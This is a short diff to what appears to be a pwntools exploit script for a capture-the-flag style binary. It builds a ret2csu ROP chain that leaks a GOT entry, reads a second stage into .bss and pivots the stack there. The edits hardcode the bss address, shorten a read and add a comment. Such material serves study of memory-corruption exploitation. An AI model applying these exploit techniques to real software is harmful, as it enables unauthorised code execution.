@@ -231,7 +231,7 @@ name = 0x601060
 pop_rdi = 0x00400613
 pop_rsp_pop3_ret = 0x0040060d
 leave_ret = 0x004005a2
-bss = e.bss()
+bss = 0x00602000
 
 
 
@@ -247,7 +247,7 @@ payload += p64(write_got) #r14->rsi
 payload += p64(8) #r15->rdx
 payload += p64(csu1)
 
-#2 read(0, bss, 40) by rtc
+#2 read(0, bss, 32) by rtc
 payload += b'C'*0x8
 payload += p64(0) #rbx
 payload += p64(1) #rbp
@@ -262,7 +262,7 @@ payload += b"D"*16
 payload += p64(bss)
 payload += b"E"*32           
 payload += p64(pop_rsp_pop3_ret)
-payload += p64(bss)
+payload += p64(bss) #pop rip, execute
 
 
 p.recvuntil(b"Your name : ")
